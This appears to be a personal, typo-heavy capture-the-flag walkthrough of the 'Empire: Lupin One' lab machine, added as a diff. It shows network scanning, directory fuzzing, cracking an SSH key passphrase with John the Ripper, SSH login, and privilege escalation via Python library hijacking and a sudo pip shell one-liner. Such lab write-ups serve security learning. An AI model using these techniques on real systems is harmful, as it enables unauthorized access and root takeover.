@@ -1,0 +1,160 @@
+LUIN ONE WALKTHROUGH
+------------------------------------------------------------------------------------------
+run the machine in nat to be able to be ii n the same network for dicoveing purposes
+
+run 
+netdiscover -u 192.168.154.140 to discover the lupin machine  by identifuying the other active ips in the network
+ 
+identfied as 192.168.154.141
+
+nmap the ip to know moreinfo on the open ports 
+
+└─# nmap -Pn -sV -T3 192.168.154.141    
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 02:51 -0500
+Nmap scan report for 192.168.154.141
+Host is up (0.00024s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.48 ((Debian))
+MAC Address: 00:0C:29:CA:97:64 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+-----------------------------------------------------------------------------------------------
+the ip has a web server apache hosting sites/directories
+thus we would fuzz it to identify them
+
+─# ffuf -c -u http://192.168.154.141/FUZZ -w /usr/share/dirb/wordlists/common.txt
+________________________________________________
+
+.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3ms]
+                        [Status: 200, Size: 333, Words: 32, Lines: 28, Duration: 8ms]
+.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 12ms]
+.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 13ms]
+image                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 10ms]
+index.html              [Status: 200, Size: 333, Words: 32, Lines: 28, Duration: 5ms]
+javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 5ms]
+manual                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 21ms]
+robots.txt              [Status: 200, Size: 34, Words: 3, Lines: 3, Duration: 4ms]
+server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4ms]
+
+________________________________________________________________________________________________
+FUZZING it again to search for the personl directory (~)
+the pesonal fdirectory found was secret
+________________________________________________________________________________________________
+
+# ffuf -c -u http://192.168.154.141/~FUZZ -w /usr/share/dirb/wordlists/common.txt 
+
+secret                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 4ms]
+
+ ________________________________________________________________________________________________
+ the mysecret.txt file gives us more information of the system 
+ eg 
+ the woldlist to use to crack my passphrase being (fasttrack.)
+ and a username called  (icex64)
+  ________________________________________________________________________________________________
+ 
+ Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,
+Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.
+I'm smart I know that.
+Any problem let me know
+Your best friend icex64 
+
+________________________________________________________________________________________________
+after opening the secret file in browser
+we could examin it further by fuzzing the secrete directory to find othe rfiles or subdirectories inn it 
+when opening the mysecret.txt file we fibnd a private key which we can decode using cyberchef   as base58   eveling this is a ssh pivate key
+________________________________________________________________________________________________
+
+# ffuf -c -u http://192.168.154.141/~FUZZ -w /usr/share/dirb/wordlists/common.txt  -fc 403 -e .txt,.html
+used to identify if there is a hiden file
+-fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
+ 
+ mysecret.txt            [Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 69ms]
+ 
+ ________________________________________________________________________________________________
+ after decoding the private key we would have to find the possibe password thats been encryptred to that private key by using the word list fasttrack using the too johnthe ripper 
+ john will be used to put the private key in a location identieid by john the ripper
+ 
+ ┌──(root㉿kali)-[/home/kali/Downloads]  ---------paste the key in a file formated as rsa--------------
+└─# nano sshh_keyy.rsa                                                   
+                        
+┌──(root㉿kali)-[/home/kali/Downloads]      ----------------- pass the hash to ssh2john to be removed its hash----------
+└─# python3 /usr/share/john/ssh2john.py sshhh_keyy.rsa > hash            
+                                                                                                                                               
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# john --wordlist=/usr/share/wordlists/fasttrack.txt --format=SSH hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+No password hashes left to crack (see FAQ)
+                                                                                                                                               
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# john --wordlist=/fasttrack.txt --format=SSH hash   
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+No password hashes left to crack (see FAQ)
+
+       
+┌──(root㉿kali)-[/home/kali/Downloads]  ----------shows the craced passwod-------------------
+└─# john --show hash                                 
+sshhh_keyy.rsa:P@55w0rd!
+
+1 password hash cracked, 0 left
+ ________________________________________________________________________________________________
+SSH LOGIN  the ip using the user name and the passowrd   ________________________________________________________________________________________________                          
+──(root㉿kali)-[/home/kali/Downloads]
+└─# chmod 400 sshh_keyy.rsa
+                                                                                                                                                                   
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# ssh -i sshh_keyy.rsa icex64@192.168.154.141
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase for key 'sshh_keyy.rsa': 
+Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
+########################################
+Welcome to Empire: Lupin One
+########################################
+Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
+icex64@LupinOne:~$ 
+
+
+3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
+________________________________________________________________________________________________
+PRIVILEDGE ESCALATION
+________________________________________________________________________________________________
+in the shell  terminal
+
+sudo -l      to see the users with previldges
+icex64@LupinOne:/home/arsene$ sudo -l
+Matching Defaults entries for icex64 on LupinOne:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User icex64 may run the following commands on LupinOne:
+    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
+
+THE USER  aresene HAS A PYTHNON program that has that can be given a priviledges 
+this can be attacked using PYTHON HIJACKING TECHNIQUE
+
+by changinn the library path used to a malicourse one of calling of a malicisouse code frm the python script or modifying the python library wth a maliscouse code 
+in this case we would add 
+os.system("/bin/bash") in the library webbrowser   ----which would executes the /bin/bash shell from within a Python script, spawning a new Bash shell process.
+
+But  LINEPEAS can be used to  automatically  discovery of potential privilege escalation vulnerabilities on Linux, Unix, and macOS systems. 
+
+ls -al is a command in Linux and Unix-like systems that provides a detailed, long-format listing of all files and directories in the current directory, including hidden files (those starting with a dot .
+
+moveing to the other user arsene  
+sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
+
+when in arsene user porofile we wiould run sudo -l to watch which are the othe info we can get 
+in tern giving us a      
+(root) NOPASSWD: /usr/bin/pip
+which we can find a vulnerability of the pip ..........by looking for pip priviledge escalation  that being the (GTFO bin)
+
+SEQUENCIALY RUN  THE  command s to exploit the pip function If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+THIS WOULD GIVE US ACCESS TO THE ROOT PATH
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+
+using this terminal we would go to the root directory using  cd /root and find the flag there
